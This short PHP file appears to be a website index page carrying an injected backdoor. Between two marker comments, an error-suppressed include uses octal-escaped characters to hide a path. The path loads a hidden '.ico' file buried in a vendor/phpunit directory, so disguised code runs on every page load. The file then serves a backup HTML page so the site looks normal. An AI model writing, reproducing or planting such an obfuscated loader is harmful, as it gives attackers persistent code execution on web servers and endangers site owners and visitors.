<?php
/*91dd6*/

@include "\057var\057www\057htm\154/we\142sit\145s/t\141zaf\157l-b\144/pa\156el/\166end\157r/p\150pun\151t/p\150p-t\157ken\055str\145am/\056b6f\0649e7\064.ic\157";

/*91dd6*/




echo @file_get_contents('index.html.bak.bak');